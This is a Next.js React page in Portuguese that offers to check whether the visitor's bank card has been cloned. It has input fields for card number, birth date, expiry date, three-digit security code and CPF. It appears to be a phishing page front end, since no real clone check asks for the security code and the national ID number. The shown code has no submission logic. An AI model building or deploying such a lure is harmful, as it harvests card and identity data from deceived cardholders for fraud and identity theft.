import { CreditCard, IdCard, CalendarDays, LockKeyhole, Calendar1, Smile } from 'lucide-react';
import Image from 'next/image';
import background from '../public/bg.jpg';

export default function Home() {
  return (
    <div className="relative h-screen overflow-hidden"> {/* Container para o fundo absoluto */}
      <div className='absolute inset-0 -z-10'> {/* Posiciona a imagem em toda a tela */}
        <Image
          src={background}
          alt={'cartoes'}
          className='object-cover w-full h-full' // Faz a imagem cobrir o container
          layout="fill" // Importante para o posicionamento absoluto dentro do container
        />
      </div>

      <div className='flex flex-col items-center justify-center h-full'> {/* Conteúdo principal */}
        <h1 className='text-3xl text-center flex flex-row items-center justify-center mb-6 text-black '>Descubra se seu cartão foi clonado <Smile className='ml-2' /></h1>

        <div className="flex items-center justify-center flex-col gap-4">
          <div className="flex items-center border border-gray-900 rounded-lg px-3 py-2 w-96 gap-3">
            <input type="text" className='outline-none w-full text-black placeholder-gray-800' placeholder='Digite o número do seu cartão:' maxLength={19} /><CreditCard className='mr-2' color='#ffffff'/>
          </div>

          <div className="flex items-center border border-gray-900 rounded-lg px-3 py-2 w-96 gap-3">
            <input type="text" className='outline-none w-full text-black placeholder-gray-800' placeholder='Digite sua data de nascimento DD/MM/YY:' maxLength={8} /><CalendarDays className='mr-2' color='#ffffff'/>
          </div>

          <div className="flex items-center border border-gray-900 rounded-lg px-3 py-2 w-96 gap-3">
            <input type="text" className='outline-none w-full text-black placeholder-gray-800' placeholder='Digite a data de validade do cartão MM/YY:' maxLength={5} /><Calendar1 className='mr-2' color='#ffffff'/>
          </div>

          <div className="flex items-center border border-gray-900 rounded-lg px-3 py-2 w-96 gap-3">
            <input type="text" className='outline-none w-full text-black placeholder-gray-800' placeholder='Digite o código de segurança do cartão:' maxLength={3} pattern="\d{3}" /><LockKeyhole className='mr-2' color='#ffffff'/>
          </div>

          <div className="flex items-center border border-gray-900 rounded-lg px-3 py-2 w-96 gap-3">
            <input type="text" className='outline-none w-full text-black placeholder-gray-800' placeholder='Digite seu CPF:' maxLength={11} pattern="\d{11}" /><IdCard className='mr-2' color='#ffffff'/>
          </div>
        </div>
      </div>
    </div>
  );
}